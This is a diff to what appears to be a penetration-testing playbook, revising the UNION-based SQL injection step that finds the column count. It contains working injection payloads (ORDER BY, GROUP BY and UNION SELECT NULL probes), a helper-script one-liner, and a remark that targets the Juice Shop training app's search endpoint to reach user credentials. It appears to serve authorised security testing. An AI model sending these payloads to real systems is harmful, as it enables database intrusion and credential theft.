@@ -165,8 +165,17 @@ proof when results aren't reflected. Read-only; confirm the point, never dump PI
 ## Extended arsenal — UNION: column count & type matching
 
 ```
-# 1) column count — increment until the error flips (ORDER BY is cheapest):
-' ORDER BY 1-- -   ' ORDER BY 2-- -  ...  ' ORDER BY 9-- -     # first N that errors => N-1 columns
+# 1) column count — DERIVE it, never assume it. Sweep is OPEN-ENDED (no ceiling at 9/10/16):
+#    the largest N that returns a normal result == the column count. An error on a guessed N
+#    means "wrong N", NOT "not injectable" (that's an open-proof-gap — _contract/counterevidence.md —
+#    never a silent clean result). Use scripts/sqli_union.py (exponential bracket + binary search,
+#    O(log n) requests) so a wide table can't be under-counted:
+#        python -c "import sys; sys.path.insert(0,'scripts'); import sqli_union; \
+#                   print(sqli_union.derive_column_count(lambda n: order_by_ok(n)))"
+' ORDER BY 1-- -   ' ORDER BY 2-- -  ' ORDER BY 4-- -  ' ORDER BY 8-- -  ' ORDER BY 16-- -  ...  # grow past 9/16; don't stop early
+#   ! Juice Shop v20.3.0 /rest/products/search has 10 columns (an `alternateImages` col) — a scan
+#     capped at 9 reports it clean and loses User Credentials + Database Schema. Always confirm the
+#     count a 2nd way (UNION SELECT NULL*N) before extracting.
 ' GROUP BY 1,2,3-- -                                           # alt when ORDER BY is filtered
 # 2) confirm with NULLs (type-agnostic) — add a FROM where required:
 ' UNION SELECT NULL-- -   ' UNION SELECT NULL,NULL-- -  ...
